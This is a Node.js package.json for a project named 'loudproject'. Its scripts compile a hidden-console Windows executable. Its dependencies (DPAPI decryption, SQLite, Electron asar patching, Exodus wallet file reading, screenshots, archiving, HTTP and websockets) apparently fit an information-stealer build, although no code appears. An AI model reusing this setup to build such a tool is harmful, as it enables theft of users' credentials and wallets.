{
    "name": "loudproject",
    "version": "1.1.2",
    "author": "Nva INC",
    "bin": "index.js",
    "github": "https://github.com/",
    "pkg": {
        "assets": [
            "node_modules/sqlite3/build/Release/node_sqlite3.node",
            "node_modules/axios/dist/node/**/*"
        ]
    },
    "scripts": {
        "start": "node index.js",
        "bunBuild": "bun build --bytecode --target=bun --production --minify --minify-syntax --windows-hide-console --compile index.js --outfile ../dist/app | cls",
        "pkgBuild": "pkg . --output ../dist/app.exe --targets node16-win-x64 --compress=GZip | cls"
    },
    "dependencies": {
        "@primno/dpapi": "^2.0.1",
        "archiver": "^7.0.1",
        "asar": "^3.2.0",
        "axios": "^1.8.4",
        "buffer-replace": "^1.0.0",
        "glob": "^11.0.1",
        "node-forge": "^1.3.1",
        "original-fs": "^1.2.0",
        "screenshot-desktop": "^1.15.1",
        "seco-file": "^1.2.0",
        "sqlite3": "^5.1.7",
        "tslib": "^2.8.1",
        "ws": "^8.18.1"
    }
}
